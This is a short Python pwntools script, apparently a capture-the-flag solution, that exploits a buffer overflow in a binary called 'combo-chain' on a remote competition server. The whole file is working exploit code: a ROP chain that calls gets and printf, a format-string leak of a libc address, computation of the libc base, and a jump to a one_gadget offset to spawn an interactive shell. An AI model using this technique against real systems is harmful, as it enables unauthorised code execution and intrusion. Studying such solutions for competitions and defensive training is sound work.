from pwn import *
from time import sleep
#p = process('./combo-chain')
#p = gdb.debug('./combo-chain','b main')
p = remote('pwn.hsctf.com',2345)
e = ELF('./combo-chain')

libc = ELF('./libc6_2.23-0ubuntu11_amd64.so')


context(arch="amd64",os="linux")

printf_got = e.got['printf']
printf_plt = e.plt['printf']

bss = e.get_section_by_name('.bss')["sh_addr"]+100
gets = e.symbols['gets']
pop_rdi = e.search(asm('pop rdi; ret')).next()
pop_rsi = e.search(asm('pop rsi; pop r15; ret')).next()

main = e.symbols['main']

padding = 'A'*16
payload = padding + p64(pop_rdi) + p64(bss) + p64(gets) + p64(pop_rdi) + p64(bss) + p64(printf_plt) + p64(main)
p.recvuntil('!: ')
p.sendline(payload)
sleep(0.5)
p.sendline('%3$p')
leak = int(p.recv()[:16],16)
lba = leak - 0x3c48e0
p.recvuntil('!: ')
p.sendline(padding+p64(lba+0xf02a4))
p.interactive()